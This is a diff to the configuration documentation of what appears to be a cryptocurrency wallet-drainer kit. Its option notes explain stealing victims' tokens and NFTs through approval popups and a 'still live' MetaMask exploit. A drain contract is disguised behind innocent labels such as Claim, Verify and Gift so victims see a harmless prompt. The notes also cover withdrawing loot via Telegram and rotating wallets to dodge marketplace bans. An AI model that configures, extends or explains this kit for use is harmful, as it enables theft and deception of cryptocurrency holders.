@@ -31,8 +31,8 @@ Options explained:
 -use_approvement_for_tokens: Define if you prefer use approvement or token transfer (MetaMask exploit is still live so don't switch it to false: https://ibb.co/DL18PN6).
 -use_increase_allowance_for_tokens_when_disponible: Define if you prefer the first approvement popup or the second. Test it yourself, it doesn't really matter for now. ("use_approvement_for_tokensmust" be true)
 
--use_transfer_contract: Use a contract for all balance hits (you can withdraw from contract with telegram commands -> /help). Contract is good because user will see "CLAIM" + empty address: https://ibb.co/QDDRbD1.
--transfer_contract_drain_function_name: Define the method that will be used for drain the balance using contract. For now only "Claim" possilbe. ("use_transfer_contract" must be true).
+-use_transfer_contract: Use a contract for all balance hits (you can withdraw from contract with telegram commands -> /help). Contract is good because user will see the data of "transfer_contract_drain_function_name" + empty address: https://ibb.co/QDDRbD1.
+-transfer_contract_drain_function_name: Define the method that will be used for drain the balance using contract. Options possible: Claim, Confirm, Verify, Connect, Start, Gift and Enable.
 
 -create_wallet_for_seaport: This option wil create a new wallet each seaport and send you private key, it will avoid fast opensea ban. We don't recommend this option because now blur is better than opensea. ("disable_seaport" must be false).
 
@@ -74,6 +74,8 @@ Options explained:
 
 -use_cache_data: Define if you want to save all victim drained assets on cache for avoid to try to drain 2 times same asset in case of refresh and reconnect.
 
+-max_elements_on_seaport: All is on name. This option make chance smaller of a fail in case of NFTs staked.
+-max_elments_on_blur: All is on name. This option make chance smaller of a fail in case of NFTs staked.
 
 
 Additional infos:
